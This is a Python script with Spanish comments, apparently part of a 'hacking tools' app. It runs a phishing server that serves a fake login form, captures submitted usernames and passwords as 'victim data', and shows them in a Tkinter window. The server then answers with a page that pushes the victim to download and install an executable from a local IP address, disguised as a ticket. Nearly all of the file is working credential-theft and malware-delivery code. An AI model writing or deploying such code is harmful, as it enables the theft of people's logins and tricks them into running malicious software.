import http.server
import threading
import tkinter as tk
import urllib.parse
from tkinter import messagebox
from http.server import SimpleHTTPRequestHandler, HTTPServer
import socket

# Ruta absoluta al archivo form.html
DIRECTORY = '/home/jonathan/Desktop/hacking_tools_app/utils'

# Variable global para manejar el servidor
httpd = None

hilo = None  # Variable global para el hilo

victim_data=None

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/fake_form.html'
        return super().do_GET()

    def do_POST(self):
        # Obtener la longitud del contenido enviado
        content_length = int(self.headers['Content-Length'])
        # Leer el contenido enviado
        post_data = self.rfile.read(content_length)
        # Decodificar los datos del formulario
        data = urllib.parse.parse_qs(post_data.decode('utf-8'))

        # Imprimir los datos en la consola (puedes procesarlos como desees)
        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]
        global victim_data
        victim_data = f"Usuario: {username} | Contraseña: {password}"

        # Responder al cliente
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        response = f"<html><body><h1>Registro Exitoso</h1><p>Usuario: {username} ahora instala el archivo que se descargo para navegar libremente</p><a href='http://192.168.1.51:9000/descargar.exe' download='descargar.exe'>Click aqui para descargar el boleto</a></body></html>"
        self.wfile.write(response.encode('utf-8'))
        messagebox.showinfo("Datos victima: ", victim_data)

def actualizar_consola_http_server(server_entry):
    global victim_data
    server_entry.insert(tk.END, f"Datos de la victima: {victim_data}\n")

def start_http_server_en_hilo(server_entry):
    """Inicia el servidor HTTP en un hilo separado."""
    global httpd, hilo

    def start_http_server():
        global httpd

        import os
        os.chdir(DIRECTORY)

        server_entry.delete("1.0", tk.END)
        server_entry.insert(tk.END, f"Iniciando servidor HTTP en el puerto {9000}, sirviendo {DIRECTORY}...\n")
        
        handler = CustomHTTPRequestHandler
        #httpd = socketserver.TCPServer(("", 9000), handler)

        httpd = HTTPServer(('0.0.0.0', 9000), handler)

        server_entry.insert(tk.END, f"Servidor corriendo en http://192.168.1.51:{9000}.\n")

        httpd.timeout = 1  # Configura un tiempo de espera para las conexiones
        httpd.serve_forever()


    hilo = threading.Thread(target=start_http_server)
    hilo.daemon = True  # Permite que el hilo se detenga al cerrar la aplicación
    hilo.start()

def stop_http_server(server_entry):
    global httpd
    if httpd:
        server_entry.insert(tk.END, "Deteniendo el servidor...\n")
        try:
            httpd.socket.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass  # El socket ya podría estar cerrado
        httpd.server_close()
        httpd = None
        server_entry.insert(tk.END, "Servidor detenido.\n")
    else:
        server_entry.insert(tk.END, "El servidor no está en ejecución.\n")

